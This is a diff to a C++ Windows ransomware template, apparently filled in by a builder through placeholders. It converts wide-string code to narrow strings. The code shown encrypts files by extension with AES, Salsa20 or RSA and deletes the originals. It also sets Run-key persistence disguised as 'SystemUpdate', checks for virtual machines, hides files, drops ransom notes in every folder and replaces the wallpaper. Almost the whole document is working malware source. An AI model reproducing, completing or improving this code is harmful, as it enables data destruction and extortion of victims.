@@ -48,12 +48,11 @@ class AES_GCM {
 private:
     HCRYPTPROV hProv;
     HCRYPTKEY hKey;
-    HCRYPTHASH hHash;
     unsigned char key[32];
     unsigned char iv[12];
     
 public:
-    AES_GCM() : hProv(NULL), hKey(NULL), hHash(NULL) {
+    AES_GCM() : hProv(NULL), hKey(NULL) {
         if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
             return;
         }
@@ -83,7 +82,6 @@ public:
     
     ~AES_GCM() {
         if (hKey) CryptDestroyKey(hKey);
-        if (hHash) CryptDestroyHash(hHash);
         if (hProv) CryptReleaseContext(hProv, 0);
     }
     
@@ -174,21 +172,22 @@ public:
 };
 
 // ============================================================
-// ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
+// ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ (ВСЁ НА string, БЕЗ wstring)
 // ============================================================
-std::vector<std::wstring> split_string(const std::wstring& str, wchar_t delimiter) {
-    std::vector<std::wstring> result;
-    std::wstringstream ss(str);
-    std::wstring item;
+std::vector<std::string> split_string(const std::string& str, char delimiter) {
+    std::vector<std::string> result;
+    std::stringstream ss(str);
+    std::string item;
     while (std::getline(ss, item, delimiter)) {
         if (!item.empty()) result.push_back(item);
     }
     return result;
 }
 
-bool ends_with(const std::wstring& str, const std::wstring& suffix) {
-    if (suffix.size() > str.size()) return false;
-    return std::equal(suffix.rbegin(), suffix.rend(), str.rbegin());
+std::string to_lower(const std::string& str) {
+    std::string result = str;
+    std::transform(result.begin(), result.end(), result.begin(), ::tolower);
+    return result;
 }
 
 void set_wallpaper(const std::string& base64_data, const std::string& ext) {
@@ -201,38 +200,41 @@ void set_wallpaper(const std::string& base64_data, const std::string& ext) {
     std::vector<BYTE> data(size);
     CryptStringToBinaryA(base64_data.c_str(), base64_data.length(), CRYPT_STRING_BASE64, data.data(), &size, NULL, NULL);
     
-    wchar_t temp_path[MAX_PATH];
-    GetTempPathW(MAX_PATH, temp_path);
-    std::wstring wall_path = std::wstring(temp_path) + L"wall" + std::wstring(ext.begin(), ext.end());
+    char temp_path[MAX_PATH];
+    GetTempPathA(MAX_PATH, temp_path);
+    std::string wall_path = std::string(temp_path) + "wall" + ext;
     
     std::ofstream out(wall_path, std::ios::binary);
     out.write((char*)data.data(), data.size());
     out.close();
     
-    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)wall_path.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)wall_path.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
 }
 
 void add_persistence() {
-    wchar_t exe_path[MAX_PATH];
-    GetModuleFileNameW(NULL, exe_path, MAX_PATH);
+    char exe_path[MAX_PATH];
+    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
     
     HKEY hKey;
-    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegSetValueExW(hKey, L"SystemUpdate", 0, REG_SZ, (BYTE*)exe_path, (wcslen(exe_path) + 1) * sizeof(wchar_t));
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegSetValueExA(hKey, "SystemUpdate", 0, REG_SZ, (BYTE*)exe_path, strlen(exe_path) + 1);
         RegCloseKey(hKey);
     }
 }
 
-void hide_files(const std::wstring& ext) {
-    wchar_t drives[256];
-    GetLogicalDriveStringsW(256, drives);
+void hide_files(const std::string& ext) {
+    char drives[256];
+    GetLogicalDriveStringsA(256, drives);
     
-    for (wchar_t* d = drives; *d; d += wcslen(d) + 1) {
-        std::wstring drive = d;
+    for (char* d = drives; *d; d += strlen(d) + 1) {
+        std::string drive = d;
         try {
             for (auto& entry : std::filesystem::recursive_directory_iterator(drive)) {
-                if (entry.is_regular_file() && ends_with(entry.path().wstring(), ext)) {
-                    SetFileAttributesW(entry.path().c_str(), FILE_ATTRIBUTE_HIDDEN);
+                if (entry.is_regular_file()) {
+                    std::string path = entry.path().string();
+                    if (path.length() >= ext.length() && path.substr(path.length() - ext.length()) == ext) {
+                        SetFileAttributesA(path.c_str(), FILE_ATTRIBUTE_HIDDEN);
+                    }
                 }
             }
         } catch (...) {}
@@ -242,24 +244,23 @@ void hide_files(const std::wstring& ext) {
 bool detect_vm() {
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snap != INVALID_HANDLE_VALUE) {
-        PROCESSENTRY32W pe;
+        PROCESSENTRY32A pe;
         pe.dwSize = sizeof(pe);
-        if (Process32FirstW(snap, &pe)) {
+        if (Process32FirstA(snap, &pe)) {
             do {
-                std::wstring name = pe.szExeFile;
-                std::transform(name.begin(), name.end(), name.begin(), ::towlower);
-                if (name.find(L"vbox") != std::wstring::npos ||
-                    name.find(L"vmware") != std::wstring::npos ||
-                    name.find(L"virtual") != std::wstring::npos ||
-                    name.find(L"qemu") != std::wstring::npos) {
+                std::string name = pe.szExeFile;
+                std::transform(name.begin(), name.end(), name.begin(), ::tolower);
+                if (name.find("vbox") != std::string::npos ||
+                    name.find("vmware") != std::string::npos ||
+                    name.find("virtual") != std::string::npos ||
+                    name.find("qemu") != std::string::npos) {
                     CloseHandle(snap);
                     return true;
                 }
-            } while (Process32NextW(snap, &pe));
+            } while (Process32NextA(snap, &pe));
         }
         CloseHandle(snap);
     }
-    
     return false;
 }
 
@@ -268,7 +269,7 @@ void disable_defender() {
 }
 
 void fake_process_name() {
-    SetConsoleTitleW(FAKE_PROCESS_NAME_PLACEHOLDER);
+    SetConsoleTitleA(FAKE_PROCESS_NAME_PLACEHOLDER);
 }
 
 void hide_process() {
@@ -280,7 +281,7 @@ void hide_process() {
 // ============================================================
 // ШИФРОВАНИЕ ФАЙЛОВ
 // ============================================================
-void encrypt_file_aes(const std::wstring& path, const std::wstring& ext) {
+void encrypt_file_aes(const std::string& path, const std::string& ext) {
     try {
         std::ifstream in(path, std::ios::binary);
         if (!in) return;
@@ -295,16 +296,16 @@ void encrypt_file_aes(const std::wstring& path, const std::wstring& ext) {
         
         if (!aes.Encrypt(data, encrypted)) return;
         
-        std::wstring out_path = path + ext;
+        std::string out_path = path + ext;
         std::ofstream out(out_path, std::ios::binary);
         out.write((char*)encrypted.data(), encrypted.size());
         out.close();
         
-        DeleteFileW(path.c_str());
+        DeleteFileA(path.c_str());
     } catch (...) {}
 }
 
-void encrypt_file_salsa20(const std::wstring& path, const std::wstring& ext) {
+void encrypt_file_salsa20(const std::string& path, const std::string& ext) {
     try {
         std::ifstream in(path, std::ios::binary);
         if (!in) return;
@@ -318,16 +319,16 @@ void encrypt_file_salsa20(const std::wstring& path, const std::wstring& ext) {
         std::vector<BYTE> encrypted;
         salsa.Encrypt(data, encrypted);
         
-        std::wstring out_path = path + ext;
+        std::string out_path = path + ext;
         std::ofstream out(out_path, std::ios::binary);
         out.write((char*)encrypted.data(), encrypted.size());
         out.close();
         
-        DeleteFileW(path.c_str());
+        DeleteFileA(path.c_str());
     } catch (...) {}
 }
 
-void encrypt_file_rsa(const std::wstring& path, const std::wstring& ext) {
+void encrypt_file_rsa(const std::string& path, const std::string& ext) {
     try {
         std::ifstream in(path, std::ios::binary);
         if (!in) return;
@@ -342,16 +343,16 @@ void encrypt_file_rsa(const std::wstring& path, const std::wstring& ext) {
         
         if (!rsa.Encrypt(data, encrypted)) return;
         
-        std::wstring out_path = path + ext;
+        std::string out_path = path + ext;
         std::ofstream out(out_path, std::ios::binary);
         out.write((char*)encrypted.data(), encrypted.size());
         out.close();
         
-        DeleteFileW(path.c_str());
+        DeleteFileA(path.c_str());
     } catch (...) {}
 }
 
-void encrypt_file(const std::wstring& path, const std::wstring& ext, int algo) {
+void encrypt_file(const std::string& path, const std::string& ext, int algo) {
     switch (algo) {
         case 0: encrypt_file_aes(path, ext); break;
         case 1: encrypt_file_salsa20(path, ext); break;
@@ -363,16 +364,16 @@ void encrypt_file(const std::wstring& path, const std::wstring& ext, int algo) {
 // ============================================================
 // ОБХОД ПАПОК И ШИФРОВАНИЕ
 // ============================================================
-void walk_and_encrypt(const std::wstring& start_path,
-                      const std::vector<std::wstring>& extensions,
-                      const std::vector<std::wstring>& exclude_folders,
-                      const std::wstring& encrypted_ext,
+void walk_and_encrypt(const std::string& start_path,
+                      const std::vector<std::string>& extensions,
+                      const std::vector<std::string>& exclude_folders,
+                      const std::string& encrypted_ext,
                       int algo) {
     try {
         for (auto& entry : std::filesystem::recursive_directory_iterator(start_path)) {
             if (entry.is_directory()) continue;
             
-            std::wstring full_path = entry.path().wstring();
+            std::string full_path = entry.path().string();
             bool excluded = false;
             for (const auto& ex : exclude_folders) {
                 if (full_path.find(ex) == 0) {
@@ -382,8 +383,8 @@ void walk_and_encrypt(const std::wstring& start_path,
             }
             if (excluded) continue;
             
-            std::wstring ext = entry.path().extension().wstring();
-            std::transform(ext.begin(), ext.end(), ext.begin(), ::towlower);
+            std::string ext = entry.path().extension().string();
+            std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
             if (std::find(extensions.begin(), extensions.end(), ext) != extensions.end()) {
                 encrypt_file(full_path, encrypted_ext, algo);
             }
@@ -394,19 +395,19 @@ void walk_and_encrypt(const std::wstring& start_path,
 // ============================================================
 // СОЗДАНИЕ ФАЙЛОВ ВЫКУПА
 // ============================================================
-void drop_notes(const std::vector<std::wstring>& drives,
-                const std::vector<std::wstring>& exclude_folders,
-                const std::wstring& note_name,
-                const std::wstring& note_content) {
+void drop_notes(const std::vector<std::string>& drives,
+                const std::vector<std::string>& exclude_folders,
+                const std::string& note_name,
+                const std::string& note_content) {
     for (const auto& drive : drives) {
         try {
             for (auto& entry : std::filesystem::recursive_directory_iterator(drive)) {
                 if (entry.is_directory()) {
-                    std::wstring note_path = entry.path().wstring() + L"\\" + note_name;
+                    std::string note_path = entry.path().string() + "\\" + note_name;
                     
                     bool excluded = false;
                     for (const auto& ex : exclude_folders) {
-                        if (entry.path().wstring().find(ex) == 0) {
+                        if (entry.path().string().find(ex) == 0) {
                             excluded = true;
                             break;
                         }
@@ -415,7 +416,7 @@ void drop_notes(const std::vector<std::wstring>& drives,
                     
                     if (!std::filesystem::exists(note_path)) {
                         std::ofstream out(note_path);
-                        out << std::string(note_content.begin(), note_content.end());
+                        out << note_content;
                         out.close();
                     }
                 }
@@ -452,14 +453,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         Sleep(60000);
     }
     
-    std::wstring drives_str = DRIVES_PLACEHOLDER;
-    std::wstring exts_str = EXTS_PLACEHOLDER;
-    std::wstring exclude_str = FOLDERS_EXCLUDE_PLACEHOLDER;
-    std::wstring encrypted_ext = ENCRYPTED_EXT_PLACEHOLDER;
+    std::string drives_str = DRIVES_PLACEHOLDER;
+    std::string exts_str = EXTS_PLACEHOLDER;
+    std::string exclude_str = FOLDERS_EXCLUDE_PLACEHOLDER;
+    std::string encrypted_ext = ENCRYPTED_EXT_PLACEHOLDER;
     
-    auto drives = split_string(drives_str, L'|');
-    auto extensions = split_string(exts_str, L'|');
-    auto exclude_folders = split_string(exclude_str, L'|');
+    auto drives = split_string(drives_str, '|');
+    auto extensions = split_string(exts_str, '|');
+    auto exclude_folders = split_string(exclude_str, '|');
     
     int algo = ALGO_PLACEHOLDER;
     
@@ -476,8 +477,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         hide_files(encrypted_ext);
     }
     
-    std::wstring note_name = NOTE_NAME_PLACEHOLDER;
-    std::wstring note_content = NOTE_CONTENT_PLACEHOLDER;
+    std::string note_name = NOTE_NAME_PLACEHOLDER;
+    std::string note_content = NOTE_CONTENT_PLACEHOLDER;
     drop_notes(drives, exclude_folders, note_name, note_content);
     
     set_wallpaper(WALLPAPER_PLACEHOLDER, ".jpg");
